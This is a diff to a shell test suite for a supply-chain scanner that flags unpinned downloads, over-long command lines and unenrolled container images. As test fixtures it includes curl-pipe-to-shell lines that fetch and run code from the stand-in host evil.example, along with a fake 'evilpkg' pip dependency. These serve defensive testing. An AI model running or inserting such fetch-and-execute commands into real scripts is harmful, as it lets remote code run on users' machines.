@@ -21,6 +21,8 @@ bad() { failn=$((failn+1)); echo "FAIL $1"; }
 CASE=""
 check() { if "$@" >/dev/null 2>&1; then ok "$CASE"; else bad "$CASE"; fi; }
 NOW="2026-10-05T12:00:00Z"
+# cpu_ms: the user+sys CPU time, in ms, of every child this shell has run so far (a box under load cannot fail a bound set on CPU time)
+cpu_ms() { local -a f; read -ra f < <(sed 's/^.*) //' /proc/$$/stat); echo $(( (f[13] + f[14]) * 1000 / $(getconf CLK_TCK) )); }
 d() { python3 -c "import datetime,sys;print((datetime.datetime(2026,10,5,12)-datetime.timedelta(days=float(sys.argv[1]))).strftime('%Y-%m-%dT%H:%M:%SZ'))" "$1"; }
 SHA1=$(printf '1%.0s' $(seq 40)); SHA2=$(printf '2%.0s' $(seq 40)); SHA3=$(printf '3%.0s' $(seq 40)); SHA4=$(printf '4%.0s' $(seq 40)); SHA5=$(printf '5%.0s' $(seq 40))
 SHA6=$(printf '6%.0s' $(seq 40)); DIG4=sha256:$(printf '4%.0s' $(seq 64)); DIG5=sha256:$(printf '5%.0s' $(seq 64)); DIG1=sha256:$(printf '1%.0s' $(seq 64)); DIG2=sha256:$(printf '2%.0s' $(seq 64)); DIG3=sha256:$(printf '3%.0s' $(seq 64))
@@ -536,14 +538,14 @@ check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
 import importlib.util, os, subprocess, sys, time
 spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
 t = time.process_time()  # this process's CPU: in-process parsing only, so box load cannot fail it
-for fn in (lambda: inv.inventory({"bin/x.sh": "echo ${{ " * 60000}), lambda: inv.unmeasured({"bin/x.sh": "curl " + "http://a " * 60000})):
-    fn()                                                     # one enormous line is read whole (no length cap), quickly
+for fn in (lambda: inv.inventory({"bin/x.sh": ("echo ${{ " * 440 + "\n") * 140}), lambda: inv.unmeasured({"bin/x.sh": ("curl " + "http://a " * 390 + "\n") * 150})):
+    fn()                                                     # many lines just under 4000 characters are read by pattern, quickly
 assert time.process_time() - t < 3, time.process_time() - t
-# a long ordinary pip install with a dependency appended after 4000 characters is read whole: the last dependency is found
-pkgs = " ".join("pkg%03d==1.0.%d" % (i, i) for i in range(400))
+# a long ordinary pip install just under 4000 characters is read whole: the last dependency is found
+pkgs = " ".join("pkg%03d==1.0.%d" % (i, i) for i in range(200))
 got = inv.inventory({"bin/x.sh": "pip install " + pkgs + " evilpkg==9.9.9\n"})
 assert any(k.startswith("package:pypi/evilpkg@9.9.9") for k in got), sorted(got)[-3:]
-assert any(k.startswith("package:pypi/pkg399@1.0.399") for k in got), sorted(got)[-3:]
+assert any(k.startswith("package:pypi/pkg199@1.0.199") for k in got), sorted(got)[-3:]
 repo = sys.argv[2] + "/bigfile"; os.makedirs(repo, exist_ok=True)
 subprocess.run(["git", "init", "-q", repo], check=True)
 open(repo + "/big.sh", "w").write("# x\n" * 300000)
@@ -676,6 +678,37 @@ check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/rel.py' "$w
 pyast pyastbadc "x = (\nU = '$RU'"
 CASE="AC2 parser: an unterminated parenthesis (unreadable file) counts as importing a client: exit 1"
 check test "$rc" -eq 1
+EVU='https://evil.example/x'
+pyast pyevil1 "import httpx\nU = '$EVU'"
+CASE="AC2: a .py file importing httpx: a URL that is no release URL (https://evil.example/x) is a finding, exit 1"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/rel.py' "$work/pyevil1.out"
+pyast pyevil2 "import urllib3\nU = '$EVU'"
+CASE="AC2: a .py file importing urllib3: a URL that is no release URL is a finding, exit 1"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/rel.py' "$work/pyevil2.out"
+pyast pyevil3 "import http.client\nU = '$EVU'"
+CASE="AC2: a .py file importing http.client: a URL that is no release URL is a finding, exit 1"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/rel.py' "$work/pyevil3.out"
+pyast pyevil4 "import requests\nU = '$EVU'"
+CASE="AC2: a .py file importing requests: a URL that is no release URL is a finding, exit 1"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/rel.py' "$work/pyevil4.out"
+pyast pyword1 "m = __import__('requests')\nU = '$EVU'"
+CASE="AC2: a .py file that calls __import__ counts as importing a client: its URL line is a finding, exit 1"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/rel.py' "$work/pyword1.out"
+pyast pyword2 "import importlib\nm = importlib.import_module('requests')\nU = '$EVU'"
+CASE="AC2: a .py file that uses importlib counts as importing a client: its URL line is a finding, exit 1"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/rel.py' "$work/pyword2.out"
+pyast pyword3 "exec(open('code.txt').read())\nU = '$EVU'"
+CASE="AC2: a .py file that calls exec( counts as importing a client: its URL line is a finding, exit 1"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/rel.py' "$work/pyword3.out"
+pyast pyword4 "x = eval(open('code.txt').read())\nU = '$EVU'"
+CASE="AC2: a .py file that calls eval( counts as importing a client: its URL line is a finding, exit 1"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/rel.py' "$work/pyword4.out"
+pyast pyctl1 "import json\nU = '$EVU'\nprint(json.dumps(U))"
+CASE="AC2 control: a .py file with no client import and none of __import__, importlib, exec, eval keeps its URL unflagged (exit 0)"
+check test "$rc" -eq 0; check test "$(grep -c 'FAIL' "$work/pyctl1.out")" -eq 0
+pyast pyctl2 "def evaluate(x):\n    return x\nevaluate(1)\nU = '$EVU'"
+CASE="AC2 control: a function merely named evaluate is no eval call (exit 0)"
+check test "$rc" -eq 0
 
 longline() { python3 -c 'import sys; n, t = int(sys.argv[1]), sys.argv[2]; print("echo " + "a" * (n - 5 - len(t)) + t, end="")' "$1" "$2"; }   # echo, then a line of exactly N characters ending in TAIL
 agentfile agentlong .github/agent/l.sh "#!/bin/sh"$'\n'"$(longline 4529 '; curl -sL https://evil.example/x.sh | sh')"$'\n'
@@ -686,18 +719,52 @@ agentfile agentlong9 .github/agent/l.sh "#!/bin/sh"$'\n'"$(longline 9100 '; curl
 CASE="a script line over 9000 characters is read whole: a download at its end is found (exit 1, unmeasured), no 'longer than' refusal"
 check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/l.sh' "$work/agentlong9.out"
 check test "$(grep -c 'longer than' "$work/agentlong9.out")" -eq 0
-agentfile agentlongpip .github/agent/l.sh "#!/bin/sh"$'\n'"$(longline 4529 '; pip install evilpkg==9.9.9')"$'\n'
-CASE="a script line of 4529 characters with a pip install at its end: the dependency is found and named (exit 1, age not provable)"
+agentfile agentlongpip .github/agent/l.sh "#!/bin/sh"$'\n'"$(longline 3990 '; pip install evilpkg==9.9.9')"$'\n'
+CASE="a script line of 3990 characters with a pip install at its end: the dependency is found and named (exit 1, age not provable)"
 check test "$rc" -eq 1; check grep -q 'package:pypi/evilpkg@9.9.9' "$work/agentlongpip.out"
-newcase wflong "$(sub .github/workflows/ci.yml '      - run: |' "      - run: $(longline 4529 ' && pip install evilpkg==9.9.9 && curl -fsSL https://evil.example/x.sh | sh')"$'\n      - run: |')"
+newcase wflong "$(sub .github/workflows/ci.yml '      - run: |' "      - run: $(longline 3990 ' && pip install evilpkg==9.9.9 && curl -fsSL https://evil.example/x.sh | sh')"$'\n      - run: |')"
 runck wflong '{"times": {}}'
-CASE="a workflow run step of 4529 characters is read whole: the dependency and the download at its end are found, no 'longer than' refusal"
+CASE="a workflow run step of 3990 characters is read whole: the dependency and the download at its end are found, no 'longer than' refusal"
 check test "$rc" -eq 1; check grep -q 'package:pypi/evilpkg@9.9.9' "$work/wflong.out"; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/wflong.out"
 check test "$(grep -c 'longer than' "$work/wflong.out")" -eq 0
 newcase wflong9 "$(sub .github/workflows/ci.yml '      - run: |' "      - run: $(longline 9100 ' && pip install evilpkg==9.9.9')"$'\n      - run: |')"
 runck wflong9 '{"times": {}}'
-CASE="a workflow run step over 9000 characters is read whole: the dependency at its end is found, no 'longer than' refusal"
-check test "$rc" -eq 1; check grep -q 'package:pypi/evilpkg@9.9.9' "$work/wflong9.out"
+CASE="AC5: a workflow run step over 9000 characters is an unmeasured command line, not read by pattern: exit 1, the dependency at its end is not named"
+check test "$rc" -eq 1; check grep -qF 'a command line over 4000 characters' "$work/wflong9.out"
+check test "$(grep -c 'package:pypi/evilpkg@9.9.9' "$work/wflong9.out")" -eq 0
+# AC5: a command line over 4000 characters is never read by pattern; it is a finding of its own, named by hash and first characters
+capline() { # NAME 'python expression of the line': bin/l.sh holds that line; only the check is timed (CPU), into cap_ms
+  newcase "$1" "open('bin/l.sh', 'w').write('#!/bin/sh\n' + $2 + '\n')"
+  local t0; t0=$(cpu_ms); runck "$1" '{"times": {}}'; cap_ms=$(( $(cpu_ms) - t0 ))
+}
+capline cap4001 "'echo ' + 'a' * 3960 + '; curl -sL https://evil.example/x.sh'"
+CASE="AC5: a script line of 4001 characters holding a curl download is a finding (exit 1) named a command line over 4000 characters, with its first characters"
+check test "$rc" -eq 1; check grep -qF 'a command line over 4000 characters' "$work/cap4001.out"; check grep -qF 'echo aaaa' "$work/cap4001.out"
+CASE="AC5: the finding names the line by a hash (twelve hex digits or more)"
+check grep -Eq '[0-9a-f]{12}' "$work/cap4001.out"
+capline capslow '": $(cat \"" + "$x" * 1996'
+CASE="AC5: a line of 4001 characters built to make a backtracking pattern slow is a finding and goes through the whole check in under one second of CPU"
+check test "$rc" -eq 1; check grep -qF 'a command line over 4000 characters' "$work/capslow.out"; check test "$cap_ms" -lt 1000
+capline capcurl "'curl ' + 'http://a ' * 444"
+CASE="AC5: a line of 4001 characters of 'curl http://a' repeated is a finding and takes under one second of CPU"
+check test "$rc" -eq 1; check grep -qF 'a command line over 4000 characters' "$work/capcurl.out"; check test "$cap_ms" -lt 1000
+capline cap1mb "'curl ' + 'http://a ' * 110000"
+CASE="AC5: a line of 1 MB holding curl downloads is a finding and takes under one second of CPU"
+check test "$rc" -eq 1; check grep -qF 'a command line over 4000 characters' "$work/cap1mb.out"; check test "$cap_ms" -lt 1000
+capline cap4000 "'echo ' + 'a' * 3958 + '; curl -sL https://evil.example/x.sh'"
+CASE="AC5 control: a line of exactly 4000 characters with a plain curl download is scanned normally (exit 1, unmeasured download, no over-cap finding)"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/l.sh' "$work/cap4000.out"
+check test "$(grep -c 'a command line over 4000 characters' "$work/cap4000.out")" -eq 0
+CASE="AC5: the items reader (pin-inventory) reports a line over 4000 characters as an unmeasured command line, and a line of 4000 as an ordinary download"
+check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
+def line(n): return "echo " + "a" * (n - 5 - 31) + "; curl -sL https://evil.example/x.sh"
+over = inv.unmeasured({"bin/x.sh": line(4001) + "\n"})
+assert any("a command line over 4000 characters" in str(x) for x in over), over
+exact = inv.unmeasured({"bin/x.sh": line(4000) + "\n"})
+assert exact and not any("a command line over 4000 characters" in str(x) for x in exact), exact
+PY
 check test "$(grep -c 'longer than' "$work/wflong9.out")" -eq 0
 agentfile agentshort .github/agent/l.sh "#!/bin/sh"$'\n'"echo $(printf 'a%.0s' $(seq 3900))"$'\n'
 CASE="a command line of 3900 characters is read: the check runs (exit 0)"
@@ -2244,8 +2311,6 @@ PY
 # --- REQ-SUP-001-AC16, a reviewed_files row rules EVERY unmeasured occurrence of its file while body-sha256 equals the sha256 of the lines
 # '<path> <sha256 of the file's bytes>' (the row's file first, then the files it sources by a plain literal line, by path, each line ending in a
 # newline). Any change to the reviewed file or to a file it sources stops the row matching. No other field is part of a row. ---
-# cpu_ms: the user+sys CPU time, in ms, of every child this shell has run so far (a box under load cannot fail a bound set on CPU time)
-cpu_ms() { local -a f; read -ra f < <(sed 's/^.*) //' /proc/$$/stat); echo $(( (f[13] + f[14]) * 1000 / $(getconf CLK_TCK) )); }
 BHL='echo "curl $*" >>"$CALLS"'
 BHO="cat >stub <<'EOF'"
 # bhx PATH CONTENT [PATH CONTENT]...: the body hash of those files (the first is the row's file; the rest by path); a CONTENT of @absent
@@ -4765,7 +4830,7 @@ for name in ("ghcr.io/o/p", "GHCR.IO/o/p", "Ghcr.Io:443/o/p", "alpine", "library
     assert not judge(name, [(YOUNG, "registry-push")])[0], name                 # too young is too young
 PY
 CASE="pin age of images: an image on a registry that image-publishers.json does not name FAILS (exit 1, says so), "
-CASE+="whatever the proofs and the spelling of the host; an enrolled one is passed on to the signature check"
+CASE+="whatever the proofs and the spelling of the host; an enrolled one off ghcr.io and Docker Hub still fails the age check (no registry time for it)"
 check python3 - "$chk" <<'PY'
 import datetime, importlib.util, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1])
@@ -4784,13 +4849,14 @@ for name, host in (("registry.example:5000/team/p", "registry.example:5000"), ("
         assert not ok and host in why and "image-publishers.json" in why and "\n" not in why, (name, src, why)
 for name in ("gcr.io/distroless/static-debian12", "registry.k8s.io/kubectl", "REGISTRY.K8S.IO/kubectl",
              "registry.k8s.io:443/kubectl", "gcr.io/projectsigstore/cosign"):
-    ok, why, _ = judge(name, [(YOUNG, "pr-clock")])
-    assert ok and "cosign-verify" in why and "\n" not in why, (name, why)      # enrolled: the signature check is next
+    for src, t in (("pr-clock", YOUNG), ("registry-push", OLD), ("first-seen", OLD)):
+        ok, why, _ = judge(name, [(t, src)])
+        assert not ok and "age not provable" in why and "cosign-verify" not in why, (name, src, why)   # enrolled, yet dated by nothing
 ok, why, _ = judge("a/b/c", [(OLD, "registry-push")])
 assert not ok and "image-publishers.json" in why, why      # three parts and no host: no Docker Hub name, no entry
 PY
-CASE="pin age of images: an image whose publisher signs nothing has a reviewed entry saying unsigned: the age check "
-CASE+="passes it on and says no signature published, never that cosign-verify checks it"
+CASE="pin age of images: an image whose publisher signs nothing has a reviewed entry saying unsigned: on a registry "
+CASE+="other than ghcr.io and Docker Hub the entry waives the signature and never the age: it fails as age not provable"
 check python3 - "$chk" <<'PY'
 import datetime, importlib.util, json, os, sys, tempfile
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1])
@@ -4800,13 +4866,40 @@ Item = ac.inv.Item
 D = "sha256:" + "a" * 64
 now = datetime.datetime(2026, 10, 5, tzinfo=datetime.timezone.utc)
 d = tempfile.mkdtemp(); ac.PUBLISHER_PINS_FILE = os.path.join(d, "pins.json")
-json.dump({"quay.io": {"unsigned": "the publisher publishes no signature"},
+json.dump({"quay.io/o/p": {"unsigned": "the publisher publishes no signature"},
            "registry.example:5000/team/p": {"unsigned": "signs nothing"}}, open(ac.PUBLISHER_PINS_FILE, "w"))
 for name in ("quay.io/o/p", "QUAY.IO/o/p", "quay.io:443/o/p", "registry.example:5000/team/p"):
-    ok, why, _ = ac.judge_item(Item("image", name, D), [("2020-01-01T00:00:00Z", "pr-clock")], now)
-    assert ok and "no signature published" in why and "cosign-verify" not in why and "verified" not in why, (name, why)
+    for src in ("pr-clock", "registry-push"):
+        ok, why, _ = ac.judge_item(Item("image", name, D), [("2020-01-01T00:00:00Z", src)], now)
+        assert not ok and "age not provable" in why and "no signature published" not in why, (name, src, why)
 ok, why, _ = ac.judge_item(Item("image", "registry.example:5000/team/other", D), [], now)
 assert not ok and "image-publishers.json" in why, why       # the entry names one image: another image is not enrolled
+PY
+CASE="AC3: an image on a registry that is not ghcr.io or Docker Hub fails the age check (age not provable) even when image-publishers.json enrols it by "
+CASE+="its image name, and an unsigned entry waives the signature and never the age; a registry-alone entry enrols nothing; ghcr.io keeps its registry time"
+check python3 - "$chk" <<'PY'
+import datetime, importlib.util, json, os, sys, tempfile
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+Item = ac.inv.Item
+D = "sha256:" + "a" * 64
+now = datetime.datetime(2026, 10, 5, tzinfo=datetime.timezone.utc)
+OLD = "2020-01-01T00:00:00Z"
+ID = {"issuer": "https://accounts.google.com", "subject": "s@example.org"}
+d = tempfile.mkdtemp(); ac.PUBLISHER_PINS_FILE = os.path.join(d, "pins.json")
+def judge(pins, name, proofs):
+    json.dump(pins, open(ac.PUBLISHER_PINS_FILE, "w"))
+    return ac.judge_item(Item("image", name, D), proofs, now)
+N = "registry.example.com/team/app"
+for pins in ({N: {"keyless": [ID]}}, {N: {"unsigned": "signs nothing"}}):
+    for src in ("registry-push", "pr-clock", "first-seen"):
+        ok, why, _ = judge(pins, N, [(OLD, src)])
+        assert not ok and "age not provable" in why, (pins, src, why)
+ok, why, _ = judge({"registry.example.com": {"unsigned": "signs nothing"}}, N, [(OLD, "registry-push")])
+assert not ok and "registry.example.com" in why and "image-publishers.json" in why, why      # a registry alone is no entry
+ok, why, _ = judge({"registry.example.com": {"keyless": [ID]}}, N, [(OLD, "registry-push")])
+assert not ok and "image-publishers.json" in why, why
+recent = (now - datetime.timedelta(days=10)).strftime("%Y-%m-%dT%H:%M:%SZ")
+assert judge({}, "ghcr.io/o/p", [(recent, "registry-push")])[0]                                # control: ghcr.io, 10 days old
 PY
 CASE="pin age of images (CI cosign job): an image on an unenrolled registry fails (exit 1, FAIL line naming it) and "
 CASE+="runs no verifier; an unsigned entry says no signature published (exit 0, never ok or verified, no verifier); "
@@ -4821,7 +4914,8 @@ D = "sha256:" + "c" * 64
 COSIGN = "gcr.io/projectsigstore/cosign@sha256:" + "9" * 64
 ID = {"issuer": "https://accounts.google.com", "subject": "s@example.org"}
 d = tempfile.mkdtemp(); ac.PUBLISHER_PINS_FILE = os.path.join(d, "pins.json")
-pins = {"signed.example": {"keyless": [ID]}, "unsigned.example": {"unsigned": "the publisher publishes no signature"}}
+U = {"unsigned": "the publisher publishes no signature"}
+pins = {"signed.example/o/p": {"keyless": [ID]}, "signed.example/o/q": {"keyless": [ID]}, "unsigned.example/o/p": U, "unsigned.example/o/q": U}
 json.dump(pins, open(ac.PUBLISHER_PINS_FILE, "w"))
 def go(names, code=0):
     ac.inv.load_at = lambda r, rev: {n: ac.inv.Item("image", n, D) for n in names}
